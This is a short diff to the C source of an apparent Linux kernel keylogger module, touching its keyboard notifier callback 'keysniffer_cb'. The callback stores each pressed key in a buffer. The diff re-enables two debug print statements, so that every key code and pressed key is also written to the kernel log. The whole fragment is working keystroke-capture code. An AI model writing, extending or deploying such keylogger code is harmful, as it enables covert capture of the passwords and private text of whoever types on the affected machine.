@@ -111,8 +111,8 @@ int keysniffer_cb(struct notifier_block *nblock,
 	struct keyboard_notifier_param *param = _param;
 	const char *pressed_key;
 
-	/* pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
-		code, param->down, param->shift, param->value); */
+	pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
+		code, param->down, param->shift, param->value);
 
 	if (!(param->down))
 		return NOTIFY_OK;
@@ -133,7 +133,7 @@ int keysniffer_cb(struct notifier_block *nblock,
 			buf_pos += len;
 			keys_buf[buf_pos++] = '\n';
 
-			/* pr_debug("%s\n", pressed_key; */
+			pr_debug("%s\n", pressed_key);
 		}
 	}
 
